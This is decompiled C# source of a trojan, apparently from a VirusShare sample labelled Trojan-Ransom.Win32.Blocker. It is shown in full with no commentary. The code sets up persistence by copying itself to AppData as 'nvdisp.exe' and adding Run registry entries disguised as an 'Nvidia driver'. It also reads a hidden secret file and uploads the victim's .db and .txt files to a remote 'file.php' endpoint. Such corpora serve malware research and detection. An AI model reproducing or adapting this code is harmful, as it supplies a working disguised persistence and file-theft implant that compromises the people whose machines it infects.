// Decompiled with JetBrains decompiler
// Type: PHP_Bot.Methods
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace PHP_Bot
{
  public static class Methods
  {
    public static void startup()
    {
      string sourceFileName = Application.ExecutablePath.ToString();
      string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
      try
      {
        System.IO.File.Copy(sourceFileName, destFileName, false);
        sourceFileName = destFileName;
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) destFileName);
        registryKey.Close();
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Nvidia driver") == null)
          registryKey.SetValue("Nvidia driver", (object) sourceFileName);
        registryKey.Close();
      }
      catch
      {
      }
    }

    public static string GetSecret()
    {
      string secret = "";
      try
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\._rss"))
          return "scott";
        secret = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\._rss").ReadLine();
      }
      catch
      {
      }
      return secret;
    }

    public static void UploadFile(string path)
    {
      try
      {
        if (!path.EndsWith(".db") && !path.EndsWith(".txt"))
          return;
        Methods.UploadFileEx(path, Config.Base + "file.php", "mud", (string) null, new NameValueCollection()
        {
          ["s"] = Config.Secret
        }, (CookieContainer) null);
      }
      catch
      {
      }
    }

    public static string UploadFileEx(
      string uploadfile,
      string url,
      string fileFormName,
      string contenttype,
      NameValueCollection querystring,
      CookieContainer cookies)
    {
      try
      {
        if (fileFormName == null || fileFormName.Length == 0)
          fileFormName = "file";
        if (contenttype == null || contenttype.Length == 0)
          contenttype = "application/octet-stream";
        string str1 = "?";
        if (querystring != null)
        {
          foreach (string key in querystring.Keys)
            str1 = str1 + key + "=" + querystring.Get(key) + "&";
        }
        Uri requestUri = new Uri(url + str1);
        string str2 = "----------" + DateTime.Now.Ticks.ToString("x");
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUri);
        httpWebRequest.CookieContainer = cookies;
        httpWebRequest.ContentType = "multipart/form-data; boundary=" + str2;
        httpWebRequest.Method = "POST";
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("--");
        stringBuilder.Append(str2);
        stringBuilder.Append("\r\n");
        stringBuilder.Append("Content-Disposition: form-data; name=\"");
        stringBuilder.Append(fileFormName);
        stringBuilder.Append("\"; filename=\"");
        stringBuilder.Append(Path.GetFileName(uploadfile));
        stringBuilder.Append("\"");
        stringBuilder.Append("\r\n");
        stringBuilder.Append("Content-Type: ");
        stringBuilder.Append(contenttype);
        stringBuilder.Append("\r\n");
        stringBuilder.Append("\r\n");
        byte[] bytes1 = Encoding.UTF8.GetBytes(stringBuilder.ToString());
        byte[] bytes2 = Encoding.ASCII.GetBytes("\r\n--" + str2 + "\r\n");
        FileStream fileStream = new FileStream(uploadfile, FileMode.Open, FileAccess.Read);
        long num = (long) bytes1.Length + fileStream.Length + (long) bytes2.Length;
        httpWebRequest.ContentLength = num;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes1, 0, bytes1.Length);
        byte[] buffer = new byte[(IntPtr) checked ((uint) Math.Min(4096, (int) fileStream.Length))];
        int count;
        while ((count = fileStream.Read(buffer, 0, buffer.Length)) != 0)
          requestStream.Write(buffer, 0, count);
        requestStream.Write(bytes2, 0, bytes2.Length);
        return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
      }
      catch
      {
      }
      return "";
    }
  }
}
